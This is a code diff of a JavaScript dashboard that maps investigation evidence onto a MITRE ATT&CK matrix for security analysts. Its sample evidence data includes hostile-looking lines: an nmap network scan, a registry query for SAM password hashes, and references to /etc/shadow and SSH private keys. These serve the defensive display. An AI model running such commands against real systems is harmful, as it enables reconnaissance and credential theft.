+            { type:"finding", text:"GDI screen capture API calls from injected thread in explorer.exe" }
+        ],
+        "T1046": [
+            { type:"finding", text:"nmap -sV -p 22,80,443,3389 10.0.0.0/24 executed from compromised host" },
+            { type:"ioc", text:"Port scan from 10.0.4.12 targeting 10.0.1.0/24 (SYN scan detected)" }
+        ],
+        "T1132": [
+            { type:"finding", text:"C2 commands encoded in Base64 within HTTP Cookie header values" }
+        ],
+        "T1095": [
+            { type:"ioc", text:"ICMP tunnel detected: 1,400-byte packets at regular intervals to 185.220.101.34" }
+        ],
+        "T1552": [
+            { type:"file", text:"C:\\Users\\admin\\.ssh\\id_rsa - private SSH key found in user profile" },
+            { type:"file", text:"/etc/shadow - credential file accessed via privilege escalation" },
+            { type:"finding", text:"Unattended.xml containing plaintext credentials at C:\\Windows\\Panther\\" }
+        ],
+        "T1558": [
+            { type:"finding", text:"Kerberoasting: Requesting service tickets for SPNs with admin privileges" },
+            { type:"ioc", text:"TGS-REQ for MSSQLSvc/db-server-01.corp.local:1433 - crackable hash obtained" }
+        ],
+        "T1012": [
+            { type:"finding", text:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
+            { type:"finding", text:"Reg query HKLM\\SAM for password hashes" }
+        ],
+        "T1496": [
+            { type:"finding", text:"Cryptominer process xmrig.exe consuming 98% CPU on WORKSTATION-07" },
+            { type:"ioc", text:"Mining pool connection: stratum+tcp://pool.minexmr[.]com:443" }
+        ],
+        "T1203": [
+            { type:"finding", text:"Office document macro exploitation: CVE-2023-36884 via malicious Excel file" }
+        ]
+    };
+}
+
+// ============================================
+// Render the matrix
+// ============================================
+function renderMatrix(filter) {
+    const container = document.getElementById('matrixContainer');
+    container.innerHTML = '';
+
+    const tacticNames = Object.keys(MITRE_DATA);
+    const maxRows = Math.max(...tacticNames.map(t => MITRE_DATA[t].techniques.length));
+
+    // Build grid template: first column for tactic headers, rest for technique columns
+    const colTemplate = '180px ' + tacticNames.map(() => '1fr').join(' ');
+    const grid = document.createElement('div');
+    grid.className = 'matrix-table';
+    grid.style.gridTemplateColumns = colTemplate;
+
+    // Row 0: Tactic headers (with empty first cell)
+    const cornerCell = document.createElement('div');
+    cornerCell.className = 'tactic-header';
+    cornerCell.style.background = 'var(--bg-deep)';
+    cornerCell.style.border = '1px solid var(--border)';
+    cornerCell.innerHTML = '<div class="tactic-name" style="color:var(--text-muted);">TECHNIQUE</div>';
+    grid.appendChild(cornerCell);
+
+    tacticNames.forEach(tacticName => {
+        const data = MITRE_DATA[tacticName];
+        const detectedCount = data.techniques.filter(t => detectedTechniques[t.id]).length;
+        const header = document.createElement('div');
+        header.className = 'tactic-header';
+        header.innerHTML = `
+            <div class="tactic-name">${tacticName.toUpperCase()}</div>
+            <div class="tactic-count"><span class="det-count">${detectedCount}</span> / ${data.techniques.length}</div>
+        `;
+        grid.appendChild(header);
     });
 
-    col.appendChild(list);
-    container.appendChild(col);
-  });
-}
+    // Rows: one per technique index
+    for (let row = 0; row < maxRows; row++) {
+        // Row label
+        const rowLabel = document.createElement('div');
+        rowLabel.className = 'tactic-header';
+        rowLabel.style.background = 'var(--bg-deep)';
+        rowLabel.style.border = '1px solid var(--border)';
+        rowLabel.style.display = 'flex';
+        rowLabel.style.alignItems = 'center';
+        rowLabel.style.justifyContent = 'center';
+        rowLabel.style.fontSize = '10px';
+        rowLabel.style.color = 'var(--text-muted)';
+        rowLabel.style.fontFamily = "'JetBrains Mono', monospace";
+        rowLabel.textContent = String(row + 1).padStart(2, '0');
+        grid.appendChild(rowLabel);
 
-function renderStats(detected, total, low, med, high, crit) {
-  const bar = document.getElementById("statsBar");
-  bar.innerHTML = `
-    <div class="stat"><div class="val">${total}</div> Total Techniques</div>
-    <div class="stat"><div class="val">${detected}</div> Detected</div>
-    <div class="stat"><div class="dot" style="background:var(--green)"></div><div class="val">${low}</div> Low</div>
-    <div class="stat"><div class="dot" style="background:var(--yellow)"></div><div class="val">${med}</div> Medium</div>
-    <div class="stat"><div class="dot" style="background:var(--orange)"></div><div class="val">${high}</div> High</div>
-    <div class="stat"><div class="dot" style="background:var(--red)"></div><div class="val">${crit}</div> Critical</div>
-  `;
-}
+        tacticNames.forEach(tacticName => {
+            const data = MITRE_DATA[tacticName];
+            const tech = data.techniques[row];
+            const cell = document.createElement('div');
 
-// ─── Tooltip ────────────────────────────────────────────────────
-const tip = document.getElementById("tooltip");
-function showTooltip(e, tech) {
-  const c = tech.confidence;
-  tip.innerHTML = `
-    <div class="tt-id" style="color:${CONF_COLORS[c]}">${tech.id}</div>
-    <div class="tt-name">${tech.name}</div>
-    <div class="tt-desc">${tech.desc}</div>
-    <div class="tt-confidence">
-      <div class="tt-dot" style="background:${CONF_COLORS[c]}"></div>
-      ${CONF_LABELS[c]} Confidence
-    </div>
-  `;
-  tip.classList.add("visible");
-  moveTooltip(e);
-}
-function moveTooltip(e) {
-  const pad = 14;
-  let x = e.clientX + pad;
-  let y = e.clientY + pad;
-  const tw = tip.offsetWidth || 280;
-  const th = tip.offsetHeight || 120;
-  if (x + tw > window.innerWidth - pad) x = e.clientX - tw - pad;
-  if (y + th > window.innerHeight - pad) y = e.clientY - th - pad;
-  tip.style.left = x + "px";
-  tip.style.top = y + "px";
-}
-function hideTooltip() {
-  tip.classList.remove("visible");
-}
+            if (!tech) {
+                // Empty cell to fill the grid
+                cell.className = 'tech-cell not-detected';
+                cell.style.background = 'transparent';
+                cell.style.border = '1px solid transparent';
+                cell.style.cursor = 'default';
+                grid.appendChild(cell);
+                return;
+            }
 
-// ─── Search ──────────────────────────────────────────────────────
-document.getElementById("searchInput").addEventListener("input", function() {
-  searchTerm = this.value.trim().toLowerCase();
-  renderHeatmap(currentData);
-});
+            const isDetected = !!detectedTechniques[tech.id];
+            const shouldShow = filter === 'all' ||
+                (filter === 'detected' && isDetected) ||
+                (filter === 'undetected' && !isDetected);
 
-// ─── Reset ──────────────────────────────────────────────────────
-document.getElementById("btnReset").addEventListener("click", () => {
-  currentData = JSON.parse(JSON.stringify(SAMPLE_DATA));
-  searchTerm = "";
-  document.getElementById("searchInput").value = "";
-  renderHeatmap(currentData);
-  showToast("Reset to sample data");
-});
+            cell.className = `tech-cell ${isDetected ? 'detected' : 'not-detected'}`;
+            cell.dataset.techId = tech.id;
+            cell.dataset.tactic = tacticName;
+            cell.dataset.name = tech.name;
+            cell.dataset.detected = isDetected ? '1' : '0';
 
-// ─── Load from API ──────────────────────────────────────────────
-document.getElementById("btnLoad").addEventListener("click", async () => {
-  const caseId = getCaseId();
-  if (!caseId) {
-    showToast("No caseId specified. Use ?caseId=XXX", "error");
-    return;
-  }
-  const btn = document.getElementById("btnLoad");
-  btn.textContent = "Loading...";
-  btn.disabled = true;
-  try {
-    const resp = await fetch(`/reports/${caseId}/json`);
-    if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${resp.statusText}`);
-    const json = await resp.json();
+            if (!shouldShow && filter !== 'all') {
+                cell.style.opacity = '0.15';
+                cell.style.pointerEvents = 'none';
+            }
 
-    // Parse — support multiple formats
-    let techniques = [];
-    if (Array.isArray(json)) {
-      techniques = json;
-    } else if (json.techniques) {
-      techniques = json.techniques;
-    } else if (json.mitre_attack) {
-      techniques = json.mitre_attack;
-    } else if (json.data) {
-      techniques = Array.isArray(json.data) ? json.data : json.data.techniques || [];
+            const evidenceCount = isDetected ? detectedTechniques[tech.id].length : 0;
+            cell.innerHTML = `
+                <div class="tech-id">${tech.id}</div>
+                <div class="tech-name">${tech.name}</div>
+                ${isDetected ? `<div class="tech-evidence-count">${evidenceCount} item${evidenceCount>1?'s':''}</div>` : ''}
+            `;
+
+            // Hover events
+            cell.addEventListener('mouseenter', onCellHover);
+            cell.addEventListener('mousemove', onCellMove);
+            cell.addEventListener('mouseleave', onCellLeave);
+            cell.addEventListener('click', onCellClick);
+
+            grid.appendChild(cell);
+        });
     }
 
-    if (!techniques.length) {
-      showToast("No technique data found in response", "error");
-      return;
+    container.appendChild(grid);
+}
+
+// ============================================
+// Tooltip handling
+// ============================================
+const tooltip = document.getElementById('hoverTooltip');
+let tooltipActive = false;
+
+function onCellHover(e) {
+    const cell = e.currentTarget;
+    const techId = cell.dataset.techId;
+    const name = cell.dataset.name;
+    const isDetected = cell.dataset.detected === '1';
+
+    document.getElementById('ttId').textContent = techId;
+    document.getElementById('ttName').textContent = name;
+
+    const findingsDiv = document.getElementById('ttFindings');
+
+    if (isDetected && detectedTechniques[techId]) {
+        document.getElementById('ttHint').textContent = 'Click for full evidence';
+        findingsDiv.style.display = 'block';
+        findingsDiv.innerHTML = '<div style="font-size:10px;color:var(--accent-red);font-weight:600;margin-bottom:6px;">LINKED FINDINGS:</div>';
+        const items = detectedTechniques[techId].slice(0, 4);
+        items.forEach(f => {
+            const div = document.createElement('div');
+            div.className = 'tt-finding-item';
+            const icon = f.type === 'file' ? '📄' : f.type === 'ioc' ? '🎯' : f.type === 'network' ? '🌐' : '📋';
+            div.textContent = icon + ' ' + f.text;
+            findingsDiv.appendChild(div);
+        });
+        if (detectedTechniques[techId].length > 4) {
+            const more = document.createElement('div');
+            more.className = 'tt-finding-item';
+            more.style.color = 'var(--text-muted)';
+            more.textContent = `+ ${detectedTechniques[techId].length - 4} more...`;
+            findingsDiv.appendChild(more);
+        }
+    } else {
+        document.getElementById('ttHint').textContent = 'No evidence linked';
+        findingsDiv.style.display = 'none';
     }
 
-    // Normalize — ensure each item has required fields
-    currentData = techniques.map(t => ({
-      tactic: t.tactic || t.tactic_name || "Unknown",
-      id: t.id || t.technique_id || "T????",
-      name: t.name || t.technique_name || "Unknown",
-      desc: t.desc || t.description || t.technique_description || "",
-      confidence: typeof t.confidence === "number" ? Math.min(4, Math.max(0, t.confidence)) :
-                  typeof t.severity === "number" ? Math.min(4, Math.max(0, t.severity)) :
-                  typeof t.score === "number" ? Math.min(4, Math.max(0, t.score)) : 0
-    }));
+    tooltip.classList.add('visible');
+    tooltipActive = true;
+}
 
-    renderHeatmap(currentData);
-    showToast(`Loaded ${currentData.length} techniques from case ${caseId}`);
-  } catch (err) {
-    showToast("Failed: " + err.message, "error");
-  } finally {
-    btn.textContent = "Load Case Data";
-    btn.disabled = false;
-  }
+function onCellMove(e) {
+    if (!tooltipActive) return;
+    const x = e.clientX + 16;
+    const y = e.clientY + 16;
+    const maxX = window.innerWidth - 360;
+    const maxY = window.innerHeight - 200;
+    tooltip.style.left = Math.min(x, maxX) + 'px';
+    tooltip.style.top = Math.min(y, maxY) + 'px';
+}
+
+function onCellLeave() {
+    tooltip.classList.remove('visible');
+    tooltipActive = false;
+}
+
+// ============================================
+// Detail panel
+// ============================================
+function onCellClick(e) {
+    const cell = e.currentTarget;
+    const techId = cell.dataset.techId;
+    const tactic = cell.dataset.tactic;
+    const name = cell.dataset.name;
+    const isDetected = cell.dataset.detected === '1';
+
+    document.getElementById('detailTactic').textContent = tactic.toUpperCase() + ' — ' + MITRE_DATA[tactic].tactics_id;
+    document.getElementById('detailId').textContent = techId;
+    document.getElementById('detailName').textContent = name;
+
+    const statusEl = document.getElementById('detailStatus');
+    if (isDetected) {
+        statusEl.className = 'detail-status detected-status';
+        statusEl.innerHTML = '<i class="fa-solid fa-circle-exclamation"></i> DETECTED';
+    } else {
+        statusEl.className = 'detail-status not-detected-status';
+        statusEl.innerHTML = '<i class="fa-solid fa-circle-minus"></i> NOT DETECTED';
+    }
+
+    const body = document.getElementById('detailBody');
+    body.innerHTML = '';
+
+    // Evidence section
+    const evidenceSection = document.createElement('div');
+    evidenceSection.className = 'detail-section';
+
+    if (isDetected && detectedTechniques[techId]) {
+        const items = detectedTechniques[techId];
+        evidenceSection.innerHTML = `
+            <div class="detail-section-title">
+                <i class="fa-solid fa-link"></i>
+                LINKED EVIDENCE (${items.length})
+            </div>
+        `;
+        items.forEach((item, idx) => {
+            const card = document.createElement('div');
+            card.className = 'evidence-card';
+
+            let iconClass = 'fa-file-lines';
+            let typeLabel = 'Finding';
+            if (item.type === 'file') { iconClass = 'fa-file-code'; typeLabel = 'File / Artifact'; }
+            else if (item.type === 'ioc') { iconClass = 'fa-bullseye'; typeLabel = 'Indicator of Compromise'; }
+            else if (item.type === 'network') { iconClass = 'fa-network-wired'; typeLabel = 'Network Evidence'; }
+            else if (item.type === 'finding') { iconClass = 'fa-magnifying-glass'; typeLabel = 'Investigation Finding'; }
+
+            card.innerHTML = `
+                <div class="evidence-type ${item.type}">
+                    <i class="fa-solid ${iconClass}"></i>
+                    ${typeLabel} #${idx + 1}
+                </div>
+                <div class="evidence-text">${escapeHtml(item.text)}</div>
+            `;
+            evidenceSection.appendChild(card);
+        });
+    } else {
+        evidenceSection.innerHTML = `
+            <div class="detail-section-title">
+                <i class="fa-solid fa-link"></i>
+                LINKED EVIDENCE
+            </div>
+            <div class="no-evidence">
+                No evidence linked to this technique in the current case.
+                This technique was not observed during the investigation.
+            </div>
+        `;
+    }
+    body.appendChild(evidenceSection);
+
+    // Technique info
+    const infoSection = document.createElement('div');
+    infoSection.className = 'detail-section';
+    infoSection.innerHTML = `
+        <div class="detail-section-title">
+            <i class="fa-solid fa-info-circle"></i>
+            TECHNIQUE DETAILS
+        </div>
+        <div class="evidence-card" style="margin-bottom:10px;">
+            <div class="evidence-type finding"><i class="fa-solid fa-hashtag"></i> MITRE ID</div>
+            <div class="evidence-text">${techId}</div>
+        </div>
+        <div class="evidence-card" style="margin-bottom:10px;">
+            <div class="evidence-type finding"><i class="fa-solid fa-tag"></i> NAME</div>
+            <div class="evidence-text">${name}</div>
+        </div>
+        <div class="evidence-card">
+            <div class="evidence-type finding"><i class="fa-solid fa-sitemap"></i> TACTIC</div>
+            <div class="evidence-text">${tactic} (${MITRE_DATA[tactic].tactics_id})</div>
+        </div>
+    `;
+    body.appendChild(infoSection);
+
+    // MITRE ATT&CK URL
+    const linkSection = document.createElement('div');
+    linkSection.className = 'detail-section';
+    const baseId = techId.split('.')[0];
+    linkSection.innerHTML = `
+        <a href="https://attack.mitre.org/techniques/${baseId.replace('T','')}/" target="_blank" rel="noopener"
+           style="display:inline-flex;align-items:center;gap:8px;color:var(--accent-red);font-size:13px;text-decoration:none;padding:8px 16px;border:1px solid rgba(229,48,62,0.3);border-radius:6px;transition:all 0.2s;"
+           onmouseover="this.style.background='rgba(229,48,62,0.1)'" onmouseout="this.style.background='transparent'">
+            <i class="fa-solid fa-arrow-up-right-from-square"></i>
+            View on MITRE ATT&CK
+        </a>
+    `;
+    body.appendChild(linkSection);
+
+    openDetailPanel();
+}
+
+function openDetailPanel() {
+    document.getElementById('detailOverlay').classList.add('visible');
+    document.getElementById('detailPanel').classList.add('visible');
+}
+
+function closeDetailPanel() {
+    document.getElementById('detailOverlay').classList.remove('visible');
+    document.getElementById('detailPanel').classList.remove('visible');
+}
+
+document.getElementById('detailOverlay').addEventListener('click', closeDetailPanel);
+document.getElementById('detailClose').addEventListener('click', closeDetailPanel);
+
+// Keyboard: Escape closes panel
+document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeDetailPanel();
 });
 
-// ─── Init ───────────────────────────────────────────────────────
-renderHeatmap(currentData);
+// ============================================
+// Filter buttons
+// ============================================
+document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        currentFilter = btn.dataset.filter;
+        renderMatrix(currentFilter);
+    });
+});
+
+// ============================================
+// Update stats
+// ============================================
+function updateStats() {
+    let totalTechs = 0;
+    let detectedTechs = 0;
+    let totalEvidence = 0;
+
+    Object.values(MITRE_DATA).forEach(tactic => {
+        tactic.techniques.forEach(t => {
+            totalTechs++;
+            if (detectedTechniques[t.id]) {
+                detectedTechs++;
+                totalEvidence += detectedTechniques[t.id].length;
+            }
+        });
+    });
+
+    document.getElementById('statDetected').textContent = detectedTechs;
+    document.getElementById('statTotal').textContent = totalTechs;
+    document.getElementById('statEvidence').textContent = totalEvidence;
+    document.getElementById('statCoverage').textContent = totalTechs > 0
+        ? Math.round((detectedTechs / totalTechs) * 100) + '%'
+        : '0%';
+}
+
+// ============================================
+// Utility
+// ============================================
+function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+}
+
+function setStatus(type, text) {
+    const dot = document.getElementById('statusDot');
+    const txt = document.getElementById('statusText');
+    dot.className = 'status-dot ' + type;
+    txt.textContent = text;
+}
+
+// ============================================
+// Main initialization
+// ============================================
+async function init() {
+    const caseId = getCaseId();
+    document.getElementById('caseBadge').textContent = `CASE: ${caseId}`;
+
+    setStatus('loading', 'Fetching case data...');
+
+    try {
+        const data = await fetchCaseData(caseId);
+
+        if (data) {
+            setStatus('loading', 'Mapping MITRE techniques...');
+            detectedTechniques = extractTechniquesFromReport(data);
+            const techCount = Object.keys(detectedTechniques).length;
+
+            if (techCount > 0) {
+                setStatus('', `Loaded: ${techCount} techniques from case report`);
+                document.getElementById('caseBadge').textContent = `CASE: ${caseId} (API)`;
+            } else {
+                // API returned data but no techniques found - fall back to sample
+                setStatus('error', 'No MITRE techniques in report — showing sample data');
+                detectedTechniques = buildSampleData();
+                document.getElementById('caseBadge').textContent = `CASE: ${caseId} (SAMPLE)`;
+            }
+        } else {
+            // No API available - use sample data
+            setStatus('error', 'API unavailable — showing sample investigation data');
+            detectedTechniques = buildSampleData();
+            document.getElementById('caseBadge').textContent = `CASE: ${caseId} (SAMPLE)`;
+        }
+    } catch(err) {
+        console.error('Error loading case data:', err);
+        setStatus('error', 'Error loading data — showing sample');
+        detectedTechniques = buildSampleData();
+    }
+
+    // Render
+    document.getElementById('loadingState').style.display = 'none';
+    document.getElementById('matrixContainer').style.display = 'block';
+    updateStats();
+    renderMatrix(currentFilter);
+}
+
+init();
 </script>
 </body>
 </html>
